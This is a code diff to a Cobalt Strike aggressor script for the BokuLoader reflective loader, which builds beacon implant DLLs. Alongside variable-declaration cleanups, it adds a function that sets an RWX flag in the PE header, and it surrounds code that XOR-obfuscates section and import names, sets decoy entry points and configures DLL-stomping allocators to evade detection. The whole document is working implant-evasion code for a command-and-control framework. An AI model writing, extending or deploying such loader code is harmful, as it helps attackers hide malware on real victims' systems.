@@ -3,6 +3,7 @@ global('$temp_dll');
 
 # 'case insensitive sort' from sleep manual...
 sub caseInsensitiveCompare {
+	local('$a $b');
     $a = lc($1);
     $b = lc($2);
     return $a cmp $b;
@@ -25,7 +26,7 @@ sub printBytesAt{
 
 
 sub my_dump_my_pe {
-    local('$out $key $val %pemap @sorted_keys');
+    local('$my_pe $out $key $val %pemap @sorted_keys');
 	$my_pe = $1;
     %pemap = pedump($my_pe);
     @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
@@ -38,15 +39,13 @@ sub my_dump_my_pe {
     }
 }
 
+# Open windows executable CS window with crtl+1 from GUI
 bind Ctrl+1 {
 	openWindowsExecutableStageDialog();
 }
 
 sub array2Int {
-    local('@cArray');
-    local('$cVal');
-    local('$cIndex');
-
+    local('@cArray $cVal $cIndex');
     $cVal = 0;
 
     if ((size(@_) == 1) && (size($1) == 4)) { 
@@ -60,8 +59,7 @@ sub array2Int {
 }
 
 sub getStringFromOffset {
-	local('$beacon_dll $Offset $indexer $byte $y $tString');
-	local('@chars');
+	local('$beacon_dll $Offset $indexer $byte $y $tString @chars');
 
 	$beacon_dll = $1;
 	$Offset     = $2;
@@ -87,7 +85,7 @@ sub boku_pe_mask_ImportDLLNames {
     local('$import0 $import1 $import2 $import3');
     local('$import0strlen $import1strlen $import2strlen $import3strlen');
     local('$import0str $import1str $import2str $import3str');
-	local('$beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff ');
+	local('$beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff');
 	local('@rdataRawA @rdataVAA');
 	$beacon_dll = $1;
 	$xorKey     = $2;
@@ -298,11 +296,10 @@ sub xor_ImportEntryNames {
 # Mask the DLL Import Entry Names for beacon. Does not mask Ordinal Entries.
 sub boku_pe_mask_ImportNames {
 	local('%pemap');
-	local('$temp_beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff $dataRaw $dataVA $dataDiff $K32_OFT_RVA $ADVAPI32_OFT_RVA $WININET_OFT_RVA $WS2_32_OFT_RVA');
+	local('$temp_beacon_dll $xorKey $rdataRaw $rdataVA $rdataDiff $dataRaw $dataVA $dataDiff $K32_OFT_RVA $ADVAPI32_OFT_RVA $WININET_OFT_RVA $WS232_OFT_RVA');
 	local('@rdataRawA @rdataVAA @dataRawA @dataVAA @K32_VA_A @ADVAPI32_VA_A @WININET_VA_A @WS232_VA_A');
-
 	$temp_beacon_dll = $1;
-	$xorKey     = $2;
+	$xorKey          = $2;
 
 	%pemap = pedump($temp_beacon_dll);
 
@@ -358,6 +355,7 @@ sub boku_pe_mask_ImportNames {
 sub setEgg{
 	local('@Bytes');
 	local('$Offset $Egg $beacon_dll $index $Byte $x');
+	local('$Egg_p1 $Egg_p2 $index_egg');
 	$beacon_dll = $1;
 	$Egg_p1 = 0xACDC;
 	$Egg_p2 = 0xB0C0;
@@ -398,7 +396,7 @@ sub setNops{
 }
 
 sub boku_pe_mask{
-	local('$maskkey');
+	local('$maskkey $boku_pe_dll');
     $boku_pe_dll = $1;
     $maskkey = 123;
 	# CS RDI Code push r10; pop r10; MZAR - Make it NOPNOPNOPNOP
@@ -421,7 +419,7 @@ sub boku_pe_mask{
 }
 
 sub prependBytes{
-	local('$beacon_dll');
+	local('$beacon_dll $Nops');
 	$beacon_dll = $1;
 	# push rax; push rbx; pop rbx; pop rax;
 	$Nops = "PS[X";
@@ -445,7 +443,7 @@ sub boku_strrep {
 # 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
 sub setupAllocatorMethod {
 	local('$beacon_dll $allocator $module_x64 $allocator_code $allocator_code_offset');
-	local('@Bytes $Byte $index $x');
+	local('@Bytes $Byte $index $x $modstrchk');
 	$beacon_dll = $1;
 	$allocator  = $2;
 	$module_x64 = $3;
@@ -510,7 +508,8 @@ sub setNulls{
 }
 
 sub nullExportDirectory{
-	local('$beacon_dll %pemap @ExportDirectory_size_array @ExportDirectory_VA_array $ExportDirectory_size $ExportDirectory_VA');
+	local('$beacon_dll %pemap @ExportDirectory_size_array $ExportDirectory_VA');
+	local('$ExportDirectory_RawAddress $rawVsVirtualDiff @ExportDirectory_VA_array $ExportDirectory_size');	
 	$beacon_dll = $1;
 	%pemap = pedump($beacon_dll);
 	$ExportDirectory_RawAddress = 0;
@@ -708,30 +707,62 @@ sub setLoaderFlagZero{
 }
 
 
-sub generate_my_dll {
+sub setupUseRWX{
+	local('%pemap $temp_beacon_dll $Win32Version_location $use_rwx_flag');
+	local('$x $index @Bytes $Byte @OptionalHeader_location_A $OptionalHeader_location');
 
+	$temp_beacon_dll  = $1;
+	%pemap = $2;
+	$use_rwx_flag = $3;
+	# OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
+	@OptionalHeader_location_A  = values(%pemap, @("header.Optional.<location>"));
+	$OptionalHeader_location       = @OptionalHeader_location_A[0];
+	# DWORD       Win32VersionValue;
+	$Win32Version_location = $OptionalHeader_location + 0x34;
+	println("[+] OptionalHeader.Win32VersionValue location 0x".uc(formatNumber($Win32Version_location, 16)));
+	if ($use_rwx_flag eq "true"){
+		# 0xBC = 188
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Win32Version_location,188);
+	}else{
+		$temp_beacon_dll = pe_set_long($temp_beacon_dll,$Win32Version_location,0);
+	}
+	for ($x = 0; $x < 2; $x++) {
+		$index = $Win32Version_location;
+		$index += $x;
+		$Byte = byteAt($temp_beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ OptionalHeader.Win32VersionValue useRWX code at offset +0x0x".uc(formatNumber($Win32Version_location, 16))." : ".@Bytes);
+	return $temp_beacon_dll;
+}
+
+sub generate_my_dll {
+	
 	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
 	local('$prepend $magic_mz $smartinject $image_size_x64 $module_x64 $entry_point $xorKey');
+	local('$rich_header $checksum $compile_time $appended $magic_pe $DLL_name');
 
-	$name = "BokuLoader";
-
+	# Get C2 Malleable PE command options from the C2 profile
 	$profile = data_query("metadata")["c2profile"];
-
-	$userwx     = [$profile getString: ".stage.userwx"];
-	$obfuscate  = [$profile getString: ".stage.obfuscate"];
-	$sleep_mask = [$profile getString: ".stage.sleep_mask"];
-	$stomppe    = [$profile getString: ".stage.stomppe"];
-	$prepend    = [$profile getString: ".stage.transform-x64.prepend"];
-	$allocator  = [$profile getString: ".stage.allocator"];
-	$magic_mz   = [$profile getString: ".stage.magic_mz_x64"];
-	$smartinject = [$profile getString: ".stage.smartinject"];
+	$userwx         = [$profile getString: ".stage.userwx"];
+	$obfuscate      = [$profile getString: ".stage.obfuscate"];
+	$sleep_mask     = [$profile getString: ".stage.sleep_mask"];
+	$stomppe        = [$profile getString: ".stage.stomppe"];
+	#$prepend        = [$profile getString: ".stage.transform-x64"];
+	$allocator      = [$profile getString: ".stage.allocator"];
+	$magic_mz       = [$profile getString: ".stage.magic_mz_x64"];
+	$smartinject    = [$profile getString: ".stage.smartinject"];
 	$image_size_x64 = [$profile getString: ".stage.image_size_x64"];
-	$module_x64 = [$profile getString: ".stage.module_x64"];
+	$module_x64     = [$profile getString: ".stage.module_x64"];
 	$entry_point    = [$profile getString: ".stage.entry_point"];
+	$rich_header    = [$profile getString: ".stage.rich_header"];
+	$checksum       = [$profile getString: ".stage.checksum"];
+	$compile_time   = [$profile getString: ".stage.compile_time"];
+	$magic_pe       = [$profile getString: ".stage.magic_pe"];
+	$DLL_name       = [$profile getString: ".stage.name"];
 
-	#@strings = [$profile getList: ".stage.string"];
-	#println(@strings);
-
+	# Read in BokuLoader.x64.o object file into byte array
+	$name = "BokuLoader";
 	$name = $name .".x64.o";
 	warn("loading: " . $name);
 
@@ -740,46 +771,59 @@ sub generate_my_dll {
 	closef($handle);
 
 	warn("Loaded Length: " . strlen($data));
-
 	if (strlen($data) eq 0) {
 		warn("Error loading reflective loader object file.");
 		return $null;
 	}
 
+	# Extract the reflective loader shellcode from .text section of Bokuloader.x64.o
 	$loader = extract_reflective_loader($data);
-
 	warn("Extracted Length: " . strlen($loader));
-
 	if (strlen($loader) eq 0) {
 		warn("Error extracting reflective loader.");
 		return $null;
 	}
 
-	$temp_dll = setup_reflective_loader($2, $loader);
-	println("[+] Malleable PE options defined in Malleable C2 profile:");
-	println("|__ Obfuscate: ".$obfuscate);
-	println("|__ sleep_mask: ".$sleep_mask);
-	println("|__ userwx: ".$userwx);
-	println("|__ stomppe: ".$stomppe);
-	println("|__ prepend: ".$prepend);
-	println("|__ allocator: ".$allocator);
-	println("|__ magic_mz: ".$magic_mz);
-	println("|__ image_size_x64: ".$image_size_x64);
-	println("|__ module_x64: ".$module_x64);
-	println("|__ entry_point: ".$entry_point);
 	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
 
-	#my_dump_my_pe($temp_dll);
+	# Output C2 malleable PE command options to operator
+	$temp_dll = setup_reflective_loader($2, $loader);
+	println("[+] Malleable PE options defined in Malleable C2 profile:");
+	println("|__ Obfuscate        : ".$obfuscate);
+	println("|__ sleep_mask       : ".$sleep_mask);
+	# If userwx is not set in C2 profile then the value defaults to "true"
+	println("|__ userwx           : ".$userwx); 
+	println("|__ stomppe          : ".$stomppe);
+#	println("|__ prepend          : ".$prepend);
+	println("|__ allocator        : ".$allocator);
+	println("|__ magic_mz         : ".$magic_mz);
+	println("|__ magic_pe         : ".$magic_pe);
+	println("|__ image_size_x64   : ".$image_size_x64);
+	println("|__ module_x64       : ".$module_x64);
+	println("|__ entry_point      : ".$entry_point);
+	println("|__ rich_header      : ".$rich_header);
+	println("|__ checksum         : ".$checksum);
+	println("|__ compile_time     : ".$compile_time);
+	println("|__ name             : ".$DLL_name);
 
-	$temp_dll = nullExportDirectory($temp_dll);
+	my_dump_my_pe($temp_dll);
+	%pemap = pedump($temp_dll);
 
+	# Zero out the Export Directory - working. Uncomment to use.
+	#$temp_dll = nullExportDirectory($temp_dll);
+
+	# Handle useRWX 
+	$temp_dll = setupUseRWX($temp_dll,%pemap,$userwx);
+
+	# Handle entry_point option that sets the decoy entry point in optional header
 	if ($entry_point ne ""){
 		$temp_dll = setDecoyEntryPoint($temp_dll,$entry_point);
 	}else{
 		$temp_dll = setLoaderFlagZero($temp_dll);
 	}
-
+	# setup virtual beacon dll allocator. DLL stomp, heap alloc, virtual alloc, mapped
 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
+
 	if ($obfuscate eq "true") {
 		$xorKey = 0xC3;
 		println("[+] Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
@@ -788,8 +832,9 @@ sub generate_my_dll {
 		$temp_dll = boku_pe_mask_SectionNames($temp_dll, $xorKey);
 	} 
 	# honor C2 malleable PE modifications in C2 profile
-	$temp_dll = setup_transformations($temp_dll,$3);
-	$temp_dll = setup_strings($temp_dll);
+	# Disabled because the obfuscate breaks it and it won't be applied 
+#	$temp_dll = setup_transformations($temp_dll,$3);
+#	$temp_dll = setup_strings($temp_dll);
 
 #	$temp_dll = setEgg($temp_dll);
 #	$temp_dll = boku_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
